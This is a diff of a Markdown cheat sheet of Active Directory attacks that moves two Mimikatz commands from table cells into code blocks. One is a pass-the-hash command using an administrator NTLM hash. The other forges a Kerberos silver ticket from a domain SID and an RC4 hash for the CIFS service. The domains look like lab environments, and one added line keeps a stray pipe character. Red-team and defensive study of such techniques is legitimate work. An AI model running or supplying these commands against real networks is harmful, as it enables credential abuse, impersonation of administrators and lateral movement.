@@ -140,11 +140,15 @@
 
 | Pass-the-Hash  |
 | ------------- |
-|Invoke-Mimikatz -Command '"sekurlsa::pth /user:administrator /domain:ninja.corp  /target:ninja.corp /ntlm:a87f3a337d73085c45f9416be5787d86 /ptt "'|
+```
+Invoke-Mimikatz -Command '"sekurlsa::pth /user:administrator /domain:ninja.corp  /target:ninja.corp /ntlm:a87f3a337d73085c45f9416be5787d86 /ptt "'
+```
 
 |Silver Tickets  |
 | ------------- |
-|kerberos::golden /user:Administrator /domain:testlab.local /sid:S-1-5-21-1516486103-3973840447-1748718438 /target:fs01 /rc4:47b1d9d581f29b3b43845692bd4a0322 /service:cifs /ptt|
+```
+|kerberos::golden /user:Administrator /domain:testlab.local /sid:S-1-5-21-1516486103-3973840447-1748718438 /target:fs01 /rc4:47b1d9d581f29b3b43845692bd4a0322 /service:cifs /ptt
+```
 
 |Golden Tickets |
 | ------------- |
